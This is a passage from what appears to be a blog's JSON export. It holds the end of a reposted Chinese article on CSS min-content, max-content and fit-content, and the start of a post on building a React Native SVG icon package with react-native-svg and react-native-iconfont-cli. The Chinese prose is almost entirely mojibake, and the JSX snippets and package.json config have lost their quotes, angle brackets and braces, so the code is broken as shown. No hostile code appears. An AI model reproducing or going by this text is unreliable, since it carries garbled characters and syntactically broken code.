å…³äºè¿™ä¸ªæ¦‚å¿µçš„å®šä¹‰ã€‚æˆ‘è‡ªå·±æ˜¯è¿™ä¹ˆç†è§£çš„ï¼šæˆ‘åœ¨å…ƒç´ çš„å‘¨å›´åŒ…è£¹äº†ä¸€ä¸ªæ¡†ï¼Œå…ƒç´ å†…å®¹ï¼ˆå¾ˆå¤šå•è¯ï¼‰ä¼šå› æ­¤è€ŒæŠ˜è¡Œï¼Œè¿™ä¸ªæ¡†çš„å®½åº¦å°†ç­‰äºå…ƒç´ ä¸­æœ€é•¿çš„é‚£ä¸ªå•è¯ã€‚å¦‚æœæˆ‘è¿™é‡Œè¡¨è¿°æœ‰è¯¯çš„è¯ï¼Œå¸Œæœ›å¤§å®¶æ¥æ›´æ­£ã€‚ ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œæœ‰ä¸€ä¸ªæ ‡é¢˜å…ƒç´ ï¼š å¤§å®¶å¯ä»¥çœ‹è§ï¼Œå½“å…ƒç´ çš„ width è®¾ç½®æˆ min-content åï¼Œå…¶å®½åº¦ç­‰äºæœ€é•¿å•è¯çš„å®½åº¦ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„â€œawesomeâ€ã€‚ A pen byÂ AhmadÂ Shadeed max-contentmax-content è¡¨ç¤ºå…ƒç´ çš„å†…åœ¨é¦–é€‰å®½åº¦ï¼ˆintrinsic preferred widthï¼‰ï¼Œå®ƒç­‰äºå…ƒç´ å†…å®¹çš„å®½ã€‚ è¿˜ä¸¾ä¸€ä¸ªæ ‡é¢˜å…ƒç´ çš„ä¾‹å­ï¼Œä¸è¿‡è¿™æ¬¡æ”¹ç”¨ max-content äº†ï¼š æ³¨æ„è§‚å¯Ÿï¼Œå…ƒç´ å®½åº¦ç­‰äºæ ‡é¢˜å®½åº¦äº†ã€‚è¿™ä¸ªå®½åº¦æ˜¯åŠ¨æ€çš„ï¼Œéšç€æ ‡é¢˜å†…å®¹çš„æ”¹å˜ï¼Œmax-content æ‰€ä»£è¡¨çš„å€¼ä¹Ÿç›¸åº”æ”¹å˜ã€‚ fit-cotentè¿™ä¸ªå±æ€§å¯ä»¥çœ‹æˆæ˜¯ min-content å’Œ max-content çš„ç»“åˆã€‚æœç´¢çš„æ—¶å€™ï¼Œæˆ‘å‘ç° Stackoverflow ä¸Šçš„è¿™ä¸ªå›ç­”æˆ‘å¾ˆå–œæ¬¢ï¼š fit-content é»˜è®¸ä½¿ç”¨ max-contentï¼›å¦‚æœ available max-contentï¼Œé‚£å°±ä½¿ç”¨ availableï¼›å¦‚æœ available min-contentï¼Œé‚£å°±ä½¿ç”¨ min-contentã€‚ ç”»ä¸€ä¸ªæµç¨‹å›¾è¡¨ç¤ºï¼Œå°±æ˜¯ä¸‹é¢è¿™æ ·çš„ï¼š æ³¨æ„ï¼Œè¿™é‡Œçš„â€œavailableâ€è¡¨ç¤ºå…ƒç´ åœ¨è§†å£ä¸­çš„å¯ç”¨ç©ºé—´ã€‚ ğŸ¤”** è¯‘æ³¨** ä¸Šé¢çš„æµç¨‹å›¾è·Ÿ Stackoverflow ä¸Šçš„å›ç­”æ¯”èµ·æ¥ï¼Œå¹¶ä¸ååˆ†æ¸…æ™°ï¼Œåè€Œæ˜¯åè€…æ›´å®¹æ˜“ç†è§£èµ·æ¥ã€‚å…³äº Stackoverflow ä¸Šçš„å›ç­”æˆ‘çš„ç†è§£å¦‚ä¸‹ï¼š fit-content å±æ€§åˆ°åº•å–ç”¨ä½•å€¼ï¼Œè·Ÿå½“å‰å…ƒç´ çš„å¯ç”¨ç©ºé—´ï¼ˆavailableï¼‰æ˜¯ç´§å¯†ç›¸å…³çš„ã€‚ å¦‚æœå¯ç”¨ç©ºé—´å……è¶³ï¼Œé‚£å°±ç”¨ä½ å…ƒç´ çš„ max-conetnt åˆä½•å¦¨ï¼Œåæ­£å¤Ÿè£…ä½ çš„ã€‚ å¦‚æœå¯ç”¨ç©ºé—´ä¸å¤Ÿå……è£•ï¼Œæ¯” max-conetnt å°ç‚¹ï¼Œé‚£å°±å¾—ç”¨å¯ç”¨ç©ºé—´çš„å€¼äº†ï¼Œè¿™æ‰æ˜¾å¾—åˆé€‚ï¼ˆfitï¼‰ï¼Œä¸ä¼šå¯¼è‡´å†…å®¹è¶Šç•Œã€‚ å¦‚æœå¯ç”¨ç©ºé—´å¾ˆå°‘ï¼Œç”šè‡³æ¯” min-conetnt è¿˜å°ï¼Œé‚£ä¸å¥½æ„æ€ï¼Œå¾—ç”¨ min-content äº†ï¼Œä¸ç„¶æ˜¾ç¤ºä¼šå¾ˆéš¾çœ‹ï¼Œå°±ä¸åˆé€‚äº†ã€‚ è®©æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­çœ‹çœ‹å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ æŸ¥çœ‹ä¸‹é¢çš„ GIF å›¾ï¼Œè§‚å¯Ÿæ ‡é¢˜å°ºå¯¸æ˜¯å¦‚ä½•éšç€è§†å£çš„å˜åŒ–åšè°ƒæ•´çš„ã€‚ æˆ‘ä»¬å†å›é¡¾ä¸€ä¸‹å…³äº fit-content çš„çŸ¥è¯†ï¼šå¦‚æœå½“å‰çš„å¯ç”¨ç©ºé—´æ¯” max-content è¿˜å¤§çš„è¯ï¼Œwidth å°±ç­‰äº max-contentï¼›å¦‚æœå¯ç”¨ç©ºé—´æ¯” max-content çš„å°çš„è¯ï¼Œé‚£ä¹ˆ width å°±ç­‰äºå¯ç”¨ç©ºé—´çš„å®½äº†ï¼›æœ€åï¼Œå¦‚æœå¯ç”¨ç©ºé—´æ¯” min-content è¿˜å°ï¼Œé‚£ä¹ˆ width å°±ç­‰äº min-contentã€‚ åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘è§£é‡Šå®Œäº†æ¯ä¸€ä¸ªå†…åœ¨å€¼ã€‚è®©æˆ‘ä»¬è½¬å‘çœŸå®çš„æ¡ˆä¾‹æ¥çœ‹ä¸‹å§ã€‚ ä½¿ç”¨æ¡ˆä¾‹figure å’Œ captionç°åœ¨æˆ‘ä»¬å‡è®¾æœ‰ä¸€ä¸ªå¸¦ caption çš„ figureï¼Œå› ä¸ºå®ƒæ˜¯ä¸ªå—çº§å…ƒç´ ï¼Œå› æ­¤é»˜è®¤ç­‰äº 100% çˆ¶å…ƒç´ å®½åº¦çš„ã€‚ æˆ‘ä»¬é¢„æœŸçš„è¡Œä¸ºæ˜¯å¸Œæœ› figure åŒ…è£¹å›¾åƒçš„ï¼Œä½¿ç”¨ max-content å°±èƒ½å–å¾—è¿™äº›æ•ˆæœï¼Œè®© figure ä¸å†…å®¹ï¼ˆæœ€å¤§ï¼‰å®½åº¦ä¸€æ ·ã€‚ ä½†æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœå›¾ç‰‡æ¯”è§†å£èŒƒå›´è¿˜å¤§çš„è¯ï¼Œè¿™æ—¶å› ä¸º figure çš„å®½åº¦å°±ç­‰äºå›¾ç‰‡çš„å®½åº¦ï¼Œå› æ­¤å°±ä¼šå¯¼è‡´æ°´å¹³æ»šåŠ¨æ¡çš„å‡ºç°ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å°±è¦ä¸ºå›¾ç‰‡ä½¿ç”¨ fit-content äº†ã€‚å®ƒä¸ä¼šè®©å¤§å›¾ç‰‡è¶…å‡ºè§†å£ä¹‹å¤–æ˜¾ç¤ºã€‚ A pen byÂ AhmadÂ Shadeed å¸¦åˆ†éš”ç¬¦çš„æ ‡é¢˜ åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œâ€œTop Storiesâ€è¦æŠ˜æˆä¸¤è¡Œæ˜¾ç¤ºã€‚å®½åº¦è¿˜æ˜¯åŠ¨æ€çš„ï¼Œå°±æ˜¯è¯´ä¸ç®¡å®é™…æ ‡é¢˜å¦‚ä½•ï¼Œéƒ½éœ€è¦æŠ˜è¡Œã€‚ä¸ºäº†å®ç°è¿™ä¸ªæ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ min-contentã€‚ A pen byÂ AhmadÂ Shadeed å¸¦ä¸‹åˆ’çº¿çš„æ ‡é¢˜å†…åœ¨å€¼çš„å¦ä¸€ä¸ªæœ‰è¶£çš„ç”¨ä¾‹æ˜¯å¸¦è¾¹æ¡†çš„æ ‡é¢˜ï¼Œè¦æ±‚è¾¹æ¡†è·Ÿæ ‡é¢˜å†…å®¹ä¸€æ ·é•¿ã€‚è€ƒè™‘ä¸‹å›¾ï¼š æ³¨æ„ï¼Œæ ‡é¢˜æ˜¯ä¸ªå—çŠ¶å…ƒç´ ã€‚ä¸ºäº†å¾—åˆ°ä¸Šè¿°çš„æ•ˆæœï¼Œä»¥å‰çš„åšæ³•æ˜¯å°†å†…å®¹åŒ…è£…åœ¨ span æ ‡ç­¾é‡Œï¼Œç»™ span è®¾ç½®è¾¹æ¡†æ•ˆæœã€‚ å½“ç„¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å€ŸåŠ© fit-content æ¥è®©æ ‡é¢˜å®½åº¦ä¸å†…å®¹ä¸€æ ·é•¿ã€‚ A pen byÂ AhmadÂ Shadeed å¯¼èˆªå¦‚æœä¸€ä¸ªé¡µé¢å¯¼èˆªçš„å®½åº¦æ˜¯åŸºäºå†…å®¹çš„ã€‚é‚£ä¹ˆï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ max-contentï¼Œè½»æ¾å®ç°æ•ˆæœï¼š Demo Todo åˆ—è¡¨åœ¨ç½‘ä¸Šæ‰¾å†…åœ¨å€¼çš„ä½¿ç”¨æ¡ˆä¾‹çš„æ—¶å€™ï¼Œçœ‹åˆ°äº† ä¸€ç¯‡æ–‡ç« ï¼Œå°†æˆ‘å¸å¼•äº†ã€‚ è€ƒè™‘ä¸‹é¢çš„ä¾‹å­ï¼š è¿™ä¸ª Todo åˆ—è¡¨åŒ…å«ï¼šé¡µçœ‰ã€åˆ—è¡¨å’Œé¡µè„šã€‚ ä¸ç®¡æœ‰å¤šå°‘åˆ—è¡¨é¡¹ï¼Œä¸­é—´éƒ¨åˆ†çš„é«˜åº¦éƒ½åº”è¯¥æ˜¯ 100% - header - footerã€‚ä¸ºäº†å®ç°è¿™ä¸ªæ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥å°† CSS Grid ä¸ min-content æ­é…ä½¿ç”¨ã€‚ ä½ å¯èƒ½æƒ³çŸ¥é“ï¼Œå¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨ min-contentï¼Œä¼šæ˜¯ä»€ä¹ˆç»“æœå‘¢ï¼Ÿå¥½å§ï¼Œæ¥çœ‹çœ‹ï¼š èŠå¤©çª—å£è®¾æƒ³æ„å»ºä¸€ä¸ªèŠå¤©ç¨‹åºã€‚åœ¨ä¸‹é¢çš„ç¤ºä¾‹é‡Œï¼Œå¸ƒå±€ç»“æ„ä¸ Todo åˆ—è¡¨éå¸¸ç›¸ä¼¼ã€‚å½“æ²¡æœ‰\\èŠå¤©è®°å½•ï¼Œå¹¶ä¸”æ²¡æœ‰ä½¿ç”¨ min-content æ—¶ï¼Œå°±ä¼šå¯¼è‡´å¸ƒå±€é­åˆ°ç ´åã€‚ Demo Heroå‡è®¾æˆ‘ä»¬é¡µé¢ header é‡ŒåŒ…å«ä¸€ä¸ª Hero ç»„ä»¶ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©è¿™ä¸ª Hero ç»„ä»¶å®ç°åŠ¨æ€å¸ƒå±€ï¼Œå æ®ä¸€å±é‡Œå‰©ä¸‹çš„ç©ºé—´ã€‚ æœ‰ä¸¤è¡Œå†…å®¹ï¼Œç¬¬ä¸€è¡Œä½¿ç”¨çš„æ˜¯æœ€å°å†…å®¹é«˜åº¦ï¼Œè€Œç¬¬äºŒè¡Œåˆ™å¯ä»¥æ‰©å±•ã€å¡«å……å®Œå‰©ä¸‹çš„å¯ç”¨ç©ºé—´ã€‚ A pen byÂ AhmadÂ Shadeed Sidebar å’Œ Mainæˆ‘æ€»æ˜¯æƒ³çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ä»¬éè¦ç»™ä¾§è¾¹æ ä¸€ä¸ªå›ºå®šå®½åº¦å‘¢ã€‚å¦‚æœå®ƒçš„å®½åº¦æ˜¯åŸºäºå†…å®¹çš„å‘¢ï¼Ÿæ¯”å¦‚è¯´ï¼Œå®ƒæœ‰ä¸€ä¸ªåŸºäºå†…å®¹çš„æœ€å°å®½åº¦å’Œä¸€ä¸ªæœ€å¤§å®½åº¦ï¼Ÿæˆ‘ä»¬æ¥è¯•è¯•ã€‚ é€šè¿‡ä½¿ç”¨ CSS Grid fit-content å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿ä¾§è¾¹æ çš„å®½åº¦ä¸ä¼šè¶…è¿‡ 150pxï¼Œå¹¶ä¸”å¯ä»¥åœ¨å†…å®¹å¾ˆçŸ­çš„æƒ…å†µä¸‹ç¼©å°åˆ° 150px ä»¥ä¸‹ã€‚ å½“ä¾§è¾¹æ çš„å†…å®¹å¾ˆå°‘æ—¶ï¼Œå®ƒä¼šç¼©å°ä¸€ç‚¹ï¼š **ğŸ¤”****è¯‘æ³¨** è¿™çš„ fit-content() æ–‡ä¸­å¹¶æ²¡æœ‰è®²åˆ°ã€‚å¯ä»¥è¿™æ ·ç®€å•ç†è§£ï¼š ä¸€èˆ¬ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½å‡½æ•°æ—¶ï¼Œæ‰€ç”¨å‚æ•°ä¸€èˆ¬éƒ½æ˜¯å°äºå…ƒç´ çš„ max-content å€¼çš„ã€‚æ¯”å¦‚ fit-content(150px)ï¼Œé‚£ä¹ˆè¯´ 150px æ˜¯å°äºå…ƒç´  max-content å€¼çš„ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå…ƒç´ æœ€ç»ˆçš„æ¸²æŸ“å°ºå¯¸æ˜¯ä»‹äº min-content ~ 150px ä¹‹é—´çš„ã€‚å…·ä½“æ˜¯å¤šå°‘è¿˜è¦çœ‹å½“å‰çš„å¯ç”¨ç©ºé—´ï¼Œå¦‚æœå¯ç”¨ç©ºé—´å……è¶³ï¼Œæ‹¿å°±æ˜¾ç¤ºæœ€å¤§çš„ 150pxï¼Œå¦‚æœå¯ç”¨ç©ºé—´å°ï¼Œé‚£ä¹ˆå°±å– min-content ~ 150px ä¹‹é—´çš„æŸä¸ªå€¼ï¼Œå¦‚æœå¯ç”¨ç©ºé—´ä¸è¶³ï¼ˆæ¯” min-content è¿˜å°ï¼‰ï¼Œé‚£å°±ç”¨æœ€å°å€¼ min-contentï¼Œä¸èƒ½å†å°äº†ã€‚ å½“ç„¶ï¼Œå¦‚æœ fit-content() é‡Œçš„å€¼æ¯”å…ƒç´  max-content è¿˜å¤§ï¼Œé‚£ä¹ˆå…ƒç´ æœ€ç»ˆçš„æ¸²æŸ“å°ºå¯¸æ˜¯ä»‹äº min-content ~ max-content ä¹‹é—´çš„ã€‚å…·ä½“æ˜¯å¤šå°‘è¿˜è¦çœ‹å½“å‰çš„å¯ç”¨ç©ºé—´ï¼Œä¸ä¸Šé¢ç±»ä¼¼ã€‚ åæ­£ï¼Œfit-content() è¿”å›çš„æœ€å°å€¼æ˜¯ min-contentï¼Œä¸èƒ½æ¯” min-content æ›´å°äº†ã€‚ æ›´å¤šä¿¡æ¯ï¼ŒæŸ¥çœ‹ MDN ä¸Šçš„ fit-content() æ–‡æ¡£ã€‚ æ ‡é¢˜å’Œæè¿°æˆ‘ä»¬æœ‰ä¸€ä¸ªæ ‡é¢˜å’Œä¸€ä¸ªæè¿°æ–‡æœ¬ã€‚æè¿°æ–‡å­—çš„å®½åº¦ä¸èƒ½è¶…è¿‡ä¸»æ ‡é¢˜çš„å®½åº¦ã€‚å¯¹æˆ‘æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªæœ‰è¶£çš„ç”¨ä¾‹ï¼Œæˆ‘ä»¥å‰è®¤ä¸ºå®ƒä¸å¯èƒ½ä»…ç”¨ CSS å°±èƒ½å®ç°ã€‚ çœ‹ä¸‹ä¸‹é¢çš„æ¨¡å‹ã€‚ ä¸ºäº†å®ç°ä¸Šè¿°åŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦å°† min-content è®¾ç½®ä¸ºåŒ…è£…å…ƒç´ çš„å®½åº¦ï¼Œè€Œä¸ºæ ‡é¢˜å…ƒç´ è®¾ç½® width: max-contentã€‚ è¯·æ³¨æ„ï¼Œä¸Šé¢ä»£ç éœ€è¦åœ¨ç§»åŠ¨ç«¯åšäº›è°ƒæ•´é¢ï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´å¯¼è‡´æ°´å¹³æ»šåŠ¨æ¡çš„å‡ºç°ã€‚ A pen byÂ AhmadÂ Shadeed æµè§ˆå™¨å…¼å®¹æ€§æ ¹æ® Can I Use æ•°æ®ï¼Œé™¤äº† Microsoft Edge (EdgeHTML) ä¹‹å¤–çš„æ‰€æœ‰ä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒå†…åœ¨å€¼çš„è®¾ç½®äº†ã€‚ æ³¨æ„ï¼šMicrosoft Edge (Chromium) ä»å‘å¸ƒçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼ˆ79ï¼‰å°±å·²ç»æ”¯æŒäº†ã€‚ ï¼ˆæ­£æ–‡å®Œï¼‰ è½¬è½½è‡ªï¼šhttps://juejin.cn/post/6844904065692909576#heading-6","tags":["CSS"],"categories":["CSS"]},{"title":"React Native ç»„ä»¶åº“ - å›¾æ ‡ç»„ä»¶","path":"/2023/02/20/44cb562ca4b6/","content":"tags: React React Native categories: React Native ç»„ä»¶åº“ èƒŒæ™¯å›¾æ ‡ç»„ä»¶æ˜¯ç»„ä»¶åº“é‡Œä¸å¯æˆ–ç¼ºçš„ä¸€ä¸ªç»„ä»¶ï¼Œéšç€å‰ç«¯çš„ä¸æ–­å‘å±•ï¼Œå…¶å®ç°æ–¹å¼ä¹Ÿæ˜¯åœ¨ä¸æ–­çš„è¿­ä»£ï¼Œä»é›ªç¢§å›¾åˆ°å­—ä½“å›¾æ ‡å†åˆ° svg å›¾æ ‡ï¼Œå¹¶ä¸”å†é…åˆ Typescript å’Œ Tree Shaking å›¾æ ‡ç»„ä»¶ä¹Ÿèƒ½è½»æ¾çš„è·å¾—ä»£ç æç¤ºå’ŒæŒ‰éœ€åŠ è½½ã€‚ åœ¨ web ä¸­ä½¿ç”¨ svg å›¾æ ‡å¾ˆç®€å•ï¼Œæµè§ˆå™¨åŸç”Ÿæ”¯æŒ svg å…ƒç´ ï¼Œä½†æ˜¯ React Native å†…ç½®çš„ç»„ä»¶ä¸­æ²¡æœ‰ SVG ç»„ä»¶ï¼Œè¦ä½¿ç”¨ SVGï¼Œéœ€è¦è‡ªå·±å°è£…ã€‚å¹¸å¥½ç¤¾åŒºé‡Œæ—©æ—©æœ‰å¤§ä½¬å°è£…å¥½äº† - react-native-svgï¼Œæˆ‘ä»¬ç›´æ¥æ‹¿æ¥ä½¿ç”¨å°±å¥½äº†ã€‚ ä½¿ç”¨ react-native-svg å’Œæˆ‘ä»¬åœ¨ React ä¸­ä½¿ç”¨ svg å¾ˆåƒï¼Œéƒ½æœ‰ Svgã€Pathç»„ä»¶ï¼Œä¸è¿‡ä¸€ä¸ªæ˜¯åŸç”Ÿçš„ï¼Œä¸€ä¸ªéœ€è¦ä» react-native-svg ä¸­å¼•å…¥ï¼š React: import * as React from react;import SVGProps from react;const SvgComponent = (props: SVGPropsSVGSVGElement) = ( svg width=48 height=1 xmlns=http://www.w3.org/2000/svg ...props titleRectangle 5/title path d=M0 0h48v1H0z fill=#063855 fillRule=evenodd / /svg);export default SvgComponent; React Nativeï¼š import * as React from react;import Svg, SvgProps, Path from react-native-svg;/* SVGR has dropped some elements not supported by react-native-svg: title */const SvgComponent = (props: SvgProps) = ( Svg width=48 height=1 xmlns=http://www.w3.org/2000/svg ...props Path d=M0 0h48v1H0z fill=#063855 fillRule=evenodd / /Svg);export default SvgComponent; åœ¨ React Native ä½¿ç”¨ svgï¼ŒåŸºæœ¬å°±ç›¸å½“äºæŠŠä»£ç ä» React ä¸­ copy è¿‡æ¥ï¼Œå°†æ‰€æœ‰çš„ svg å…ƒç´ æ¢æˆé©¼å³°æ ·å¼çš„è‡ªå®šä¹‰ç»„ä»¶ï¼Œç„¶åä» react-native-svg ä¸­å¼•å…¥ã€‚ è¿™é‡Œæ¨èä¸ªå·¥å…· SVGR Playgroundï¼Œå¯ä»¥å°† svg è½¬æ¢æˆ React React Native ç»„ä»¶ï¼Œçœå»æ‰‹åŠ¨ä¿®æ”¹çš„éº»çƒ¦ã€‚ å›¾æ ‡ç®¡ç†ä¸Šé¢ä»‹ç»äº†åœ¨ React Native ä¸­ä½¿ç”¨ svg å›¾æ ‡çš„å§¿åŠ¿ï¼Œä½†æ˜¯ä¸€ä¸ªå›¾æ ‡ç»„ä»¶åº“ä¸­ï¼Œå°‘åˆ™å‡ åå¤šåˆ™å‡ ç™¾ä¸ªå›¾æ ‡ï¼Œå¦‚ä½•ç®¡ç†è¿™äº›å›¾æ ‡å°±æ˜¯ä¸€ä¸ªé—®é¢˜äº†ã€‚ æœ€ç®€å•ç²—æš´çš„æ–¹å¼å°±æ˜¯ç›´æ¥æ”¾åœ¨æºç äº†ï¼Œä½†æ˜¯å½“ä½ éœ€è¦ä¿®æ”¹å’Œé¢„è§ˆå›¾æ ‡æ—¶ï¼Œä½ å°±ä¼šä½“éªŒåˆ°ä»€ä¹ˆåˆ°ç—›è‹¦ã€‚ æ›´å¥½çš„æ–¹å¼æ˜¯å€ŸåŠ©å›¾æ ‡ç®¡ç†å¹³å°ï¼Œæ¯”å¦‚ iconfontï¼Œiconpark ç­‰ï¼Œè¿™é‡Œæ¨è iconfontï¼ŒåŸå› è§ä¸‹é¢ï¼š å›¾æ ‡ç»„ä»¶ç”Ÿæˆå›¾æ ‡ç®¡ç†çš„é—®é¢˜è§£å†³äº†ï¼Œæ¥ä¸‹æ¥å°±è¦è§£å†³å¦‚ä½•å°† iconfont ä¸Šçš„å›¾æ ‡è½¬æ¢æˆå¯ä½¿ç”¨çš„å›¾æ ‡ç»„ä»¶çš„é—®é¢˜äº†ï¼Œè¿™é‡Œéœ€è¦å€ŸåŠ©ä¸ªå·¥å…· - react-native-iconfont-cliï¼Œè¿™é‡Œè´´ä¸‹ react-native-iconfont-cli éœ€è¦è§£å†³çš„ç—›ç‚¹ï¼Œä½“éªŒä¸‹å®ƒçš„å¼ºå¤§ä¹‹å¤„ï¼š å¼•ç”¨è‡ªï¼šhttps://github.com/iconfont-cli/react-native-iconfont-cli é€šå¸¸åœ°ï¼Œå½“æˆ‘ä»¬æƒ³åœ¨ RN é‡Œä½¿ç”¨ iconfontï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå€ŸåŠ© react-native-vector-icons å¯¼å…¥ ttf å­—ä½“æ–‡ä»¶ï¼Œæˆ–è€…ç›´æ¥æ‰‹åŠ¨ä¸‹è½½å„ä¸ª svg æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œç„¶åå•ä¸ªä½¿ç”¨ã€‚ ä½¿ç”¨ ttf å­—ä½“æœ‰ä¸€ä¸ªå¼Šç«¯ï¼Œå°±æ˜¯æ¯æ¬¡æ›´æ–°å›¾æ ‡ï¼Œéƒ½è¦ç›¸åº”çš„æ›´æ–° ttf æ–‡ä»¶ï¼Œç„¶åå†æ¬¡æ‰“åŒ…å‘å¸ƒ APPã€‚è€Œä¸” ttf ä¸æ”¯æŒå¤šç§è‰²å½©çš„å›¾æ ‡ï¼Œå¯¼è‡´æ‰€æœ‰å›¾æ ‡éƒ½æ˜¯å•è‰²ã€‚å¦‚æœä½ æ˜¯å€ŸåŠ© react-native-vector-iconsï¼Œè¯¥åº“å†…ç½®äº† 10 å¤šå¥— ttf æ–‡ä»¶ï¼Œåˆèµ·æ¥æœ‰ 2M å·¦å³ï¼›ä½ å¯èƒ½ç”¨ä¸åˆ°å®ƒä»¬ï¼Œä½†æ˜¯å®ƒä»¬ä»ç„¶ä¼šè¢«æ‰“åŒ…è¿›ä½ çš„ APP é‡Œã€‚ ä¸‹è½½ svg åˆ°æœ¬åœ°ä¹Ÿä¸æ–¹ä¾¿ï¼Œå› ä¸ºä½ éœ€è¦é¢å¤–ç»´æŠ¤ä¸€ä»½å›¾æ ‡å­—ä½“ï¼Œæœ‰å¯èƒ½é€ æˆçº¿ä¸Šå’Œæœ¬åœ°çš„å›¾æ ‡ä¸ä¸€è‡´é—®é¢˜ã€‚è€Œä¸”å¦‚æœä½ æƒ³åŠ¨æ€åœ°æ”¹å˜ svg çš„æ¸²æŸ“è‰²å½©ï¼ŒåŸºæœ¬ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œåªèƒ½æ¸²æŸ“åŸå›¾çš„é¢œè‰²ã€‚ ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ç”¨çº¯ Javascript å®ç° iconfont åˆ° React ç»„ä»¶çš„è½¬æ¢æ“ä½œï¼Œä¸éœ€è¦ä¾èµ– ttf å­—ä½“æ–‡ä»¶ï¼Œä¸éœ€è¦æ‰‹åŠ¨ä¸‹è½½å›¾æ ‡åˆ°æœ¬åœ°ã€‚ å¦‚ä½•ä½¿ç”¨å°±ä¸è¿‡å¤šä»‹ç»äº†ï¼ŒREADME é‡Œå†™çš„å¾ˆæ¸…æ¥šï¼Œè¿™é‡Œè´´ä¸‹æˆ‘çš„ç»„ä»¶åº“ä¸­ä½¿ç”¨çš„é…ç½®ï¼š symbol_url: //at.alicdn.com/t/font_2952809_4bb6cudcj1k.js, use_typescript: true, save_dir: ./src, default_icon_size: 18 å‘ç‰ˆå›¾æ ‡çš„ç®¡ç†å’Œç”Ÿæˆéƒ½è¯´å®Œäº†ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åˆ°è¿™é‡Œå°±è¯¥ç»“æŸäº†ï¼Œä½†æ˜¯æˆ‘çš„ç»„ä»¶åº“ä¸­å›¾æ ‡æ˜¯å•ç‹¬æŠ½å‡ºæ¥çš„ä¸€ä¸ªåŒ…ï¼Œè¿™é‡Œè¿˜éœ€è¦è¯´ä¸‹ç»„ä»¶çš„æ‰“åŒ…å’Œå‘ç‰ˆé—®é¢˜ã€‚ æ‰“åŒ…çš„è¯åœ¨ä¸Šä¸€ç¯‡æ–‡ç«  - React Native ç»„ä»¶åº“ - è„šæ‰‹æ¶ é‡Œä»‹ç»äº† React Native çš„ä¸€ä¸ªä¼˜ç§€çš„æ‰“åŒ…å·¥å…· react-native-builder-bobï¼Œè¿™é‡Œæˆ‘ä»¬å›¾æ ‡ç»„ä»¶ä¾ç„¶ä½¿ç”¨å®ƒæ¥æ‰“åŒ…ï¼Œå¦‚ä½•ä½¿ç”¨å¯ä»¥å‚è€ƒæˆ‘ä¸Šä¸€ç¯‡æ–‡ç« æˆ–è€…ç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œè¿™é‡Œè´´ä¸‹æœ€åä½¿ç”¨çš„å®Œæ•´é…ç½®ï¼š name: @rn-vant/icons, version: 0.2.0, description: rn-vant icons for react-native, keywords: [react-native, rn-vant, icon], author: bijinfeng bijinfeng@bytedance.com, license: MIT, main: lib/commonjs/index, module: lib/module/index, types: lib/typescript/index.d.ts, react-native: src/index, source: src/index, directories: lib: lib, test: __tests__ , files: [lib, src], publishConfig: access: public , scripts: generate: npx iconfont-rn, build: bob build , devDependencies: react-native-builder-bob: ^0.18.2, react-native-iconfont-cli: ^2.2.3, react-native-svg: ^12.4.4, typescript: ^4.4.3 , peerDependencies: react: *, react-native: *, react-native-svg: * , react-native-builder-bob: source: src, output: lib, targets: [ commonjs, module, [ typescript, project: tsconfig.build.json ] ] å‘å¸ƒåˆ° npm å°±ä¸è¿‡å¤šä»‹ç»ï¼Œè€ç”Ÿå¸¸è°ˆçš„é—®é¢˜äº†ï¼Œä¸€èˆ¬ Mono Repo é¡¹ç›®é‡Œéƒ½æœ‰è‡ªå·±çš„å‘å¸ƒå‘½ä»¤ï¼Œæ¯”å¦‚ï¼Œlerna é¡¹ç›®å°±ç”¨ lerna publishï¼Œä¸€èˆ¬ Multi Repo é¡¹ç›®ä½¿ç”¨ npm publishå°±å¯ä»¥äº†ã€‚å¦‚æœä¸æƒ³æ‰‹åŠ¨å‘å¸ƒï¼Œå¯ä»¥å€ŸåŠ© CICD å·¥å…·åšåˆ°è‡ªåŠ¨å‘å¸ƒï¼Œè¿™äº›ä¸åœ¨æœ¬æ–‡è®¨è®ºèŒƒå›´å†…ï¼Œå°±ä¸å¤šèµ˜è¿°äº†ã€‚ æ€»ç»“å¾—ç›Šäºå‰ç«¯å¼ºå¤§çš„ç¤¾åŒºï¼Œåœ¨ React Native ä¸­ä½¿ç”¨ SVG å›¾æ 